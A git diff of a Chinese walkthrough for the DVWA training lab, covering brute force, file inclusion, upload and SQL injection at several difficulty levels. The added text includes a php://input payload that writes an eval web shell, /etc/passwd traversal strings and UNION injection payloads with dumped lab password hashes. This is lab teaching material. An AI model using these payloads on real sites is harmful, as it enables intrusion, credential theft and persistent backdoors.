@@ -41,15 +41,15 @@ if( isset( $_GET[ 'Login' ] ) ) {
 
 burpsuite抓包,然后`Intruder`进行爆破,选中password中的参数
 
-![image-20210410103353740](image-20210410103353740.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720181646.png)
 
 加载payload
 
-![image-20210410104717313](image-20210410104717313.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720181652.png)
 
 可以看到`password`的返回长度不同,可以推测密码为`password`,然后进行手动登录验证
 
-![image-20210410105101611](image-20210410105101611.png)
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720181658.png)
 
 2. 手动注入
 
@@ -527,6 +527,8 @@ $file = $_GET[ 'page' ];
 
 无过滤,直接读`?page=/etc/passwd`
 
+也可以用`php://input`来进行写shell,`<?php fputs(fopen('shell.php','w'),'<?php eval($_POST["a"])?>')?>`
+
 ### Medium
 
 ```php
@@ -542,6 +544,8 @@ $file = str_replace( array( "../", "..\"" ), "", $file );
 
 ?>
 ```
+
+`..\""`不知道这玩意有啥用...
 
 还是可以直接读`?page=/etc/passwd`,或者利用双写来绕过`str_replace`,传入`..././..././..././..././..././etc/passwd`读取`/etc/passwd`
 
@@ -769,4 +773,217 @@ generateSessionToken();
 
 上传png图像,二次渲染后的图像仍然能够保留webshell,因此通过文件包含依然能够getshell
 
-`http://0.0.0.0:12345/vulnerabilities/fi/?page=/var/www/html/hackable/uploads/b1551a38b5fac8a13c38605e7c4ad9ad.png`
+`vulnerabilities/fi/?page=/var/www/html/hackable/uploads/b1551a38b5fac8a13c38605e7c4ad9ad.png`
+
+## SQL Injection SQL注入
+
+### Low
+
+```php
+<?php
+
+if( isset( $_REQUEST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_REQUEST[ 'id' ];
+
+    // Check database
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row["first_name"];
+        $last  = $row["last_name"];
+
+        // Feedback for end user
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+    }
+
+    mysqli_close($GLOBALS["___mysqli_ston"]);
+}
+
+?>
+```
+
+```
+ID: -1' union select null,group_concat(schema_name) from information_schema.schemata#
+First name: 
+Surname: information_schema,dvwa
+```
+
+```
+ID: -1' union select null,group_concat(table_name) from information_schema.tables where table_schema='dvwa'#
+First name: 
+Surname: guestbook,users
+```
+
+```
+ID: -1' union select null,group_concat(column_name) from information_schema.columns where table_name='users'#
+First name: 
+Surname: user_id,first_name,last_name,user,password,avatar,last_login,failed_login
+```
+
+```
+ID: -1' union select group_concat(user),group_concat(password) from users#
+First name: admin,gordonb,1337,pablo,smithy
+Surname: 5f4dcc3b5aa765d61d8327deb882cf99,e99a18c428cb38d5f260853678922e03,8d3533d75ae2c3966d7e0d4fcc69216b,0d107d09f5bbe40cade3de5c71e9e9b7,5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+```
+ID: -1' union select null,(select group_concat(user,' ',password,'\n') from users)#
+First name: 
+Surname: admin 5f4dcc3b5aa765d61d8327deb882cf99
+,gordonb e99a18c428cb38d5f260853678922e03
+,1337 8d3533d75ae2c3966d7e0d4fcc69216b
+,pablo 0d107d09f5bbe40cade3de5c71e9e9b7
+,smithy 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+### Medium
+
+由GET改为POST
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720203450.png)
+
+```php
+<?php
+
+if( isset( $_POST[ 'Submit' ] ) ) {
+    // Get input
+    $id = $_POST[ 'id' ];
+
+    $id = mysqli_real_escape_string($GLOBALS["___mysqli_ston"], $id);
+
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = $id;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query) or die( '<pre>' . mysqli_error($GLOBALS["___mysqli_ston"]) . '</pre>' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Display values
+        $first = $row["first_name"];
+        $last  = $row["last_name"];
+
+        // Feedback for end user
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+    }
+
+}
+
+// This is used later on in the index.php page
+// Setting it here so we can close the database connection in here like in the rest of the source scripts
+$query  = "SELECT COUNT(*) FROM users;";
+$result = mysqli_query($GLOBALS["___mysqli_ston"],  $query ) or die( '<pre>' . ((is_object($GLOBALS["___mysqli_ston"])) ? mysqli_error($GLOBALS["___mysqli_ston"]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '</pre>' );
+$number_of_rows = mysqli_fetch_row( $result )[0];
+
+mysqli_close($GLOBALS["___mysqli_ston"]);
+?>
+```
+
+`mysqli_real_escape_string`将`NUL (ASCII 0), \n, \r, \, ', ", Control-Z`转换成空字符串
+
+`id=-1+union+select+group_concat(user),group_concat(password)+from+users#&Submit=Submit`
+
+![](https://cdn.jsdelivr.net/gh/AMDyesIntelno/PicGoImg@master/20210720205442.png)
+
+### High
+
+```php
+<?php
+
+if( isset( $_SESSION [ 'id' ] ) ) {
+    // Get input
+    $id = $_SESSION[ 'id' ];
+
+    // Check database
+    $query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id' LIMIT 1;";
+    $result = mysqli_query($GLOBALS["___mysqli_ston"], $query ) or die( '<pre>Something went wrong.</pre>' );
+
+    // Get results
+    while( $row = mysqli_fetch_assoc( $result ) ) {
+        // Get values
+        $first = $row["first_name"];
+        $last  = $row["last_name"];
+
+        // Feedback for end user
+        echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+    }
+
+    ((is_null($___mysqli_res = mysqli_close($GLOBALS["___mysqli_ston"]))) ? false : $___mysqli_res);        
+}
+
+?>
+```
+
+`/vulnerabilities/sqli/session-input.php`
+
+```
+ID: -1' union select null,(select group_concat(user,' ',password,'\n') from users)#
+First name: 
+Surname: admin 5f4dcc3b5aa765d61d8327deb882cf99
+,gordonb e99a18c428cb38d5f260853678922e03
+,1337 8d3533d75ae2c3966d7e0d4fcc69216b
+,pablo 0d107d09f5bbe40cade3de5c71e9e9b7
+,smithy 5f4dcc3b5aa765d61d8327deb882cf99
+```
+
+### Impossible
+
+```php
+<?php
+
+if( isset( $_GET[ 'Submit' ] ) ) {
+    // Check Anti-CSRF token
+    checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' );
+
+    // Get input
+    $id = $_GET[ 'id' ];
+
+    // Was a number entered?
+    if(is_numeric( $id )) {
+        // Check the database
+        $data = $db->prepare( 'SELECT first_name, last_name FROM users WHERE user_id = (:id) LIMIT 1;' );
+        $data->bindParam( ':id', $id, PDO::PARAM_INT );
+        $data->execute();
+        $row = $data->fetch();
+
+        // Make sure only 1 result is returned
+        if( $data->rowCount() == 1 ) {
+            // Get values
+            $first = $row[ 'first_name' ];
+            $last  = $row[ 'last_name' ];
+
+            // Feedback for end user
+            echo "<pre>ID: {$id}<br />First name: {$first}<br />Surname: {$last}</pre>";
+        }
+    }
+}
+
+// Generate Anti-CSRF token
+generateSessionToken();
+
+?>
+```
+
+预编译加数字检测
+
+## SQL Injection (Blind) SQL盲注
+
+### Low
+
+只会返回`User ID exists in the database`或者`User ID is MISSING from the database.`
+
+传入`-1`返回`User ID is MISSING from the database.`
+
+传入`-1 or 1=1#`返回`User ID is MISSING from the database.`
+
+传入`-1' or 1=1#`返回`User ID exists in the database.`,说明闭合方式为`'`
+
+### Medium
+
+只会返回`User ID exists in the database`或者`User ID is MISSING from the database.`
+
+传入`-1`返回`User ID is MISSING from the database.`
+
+传入`-1 or 1=1#`返回`User ID exists in the database.`
+
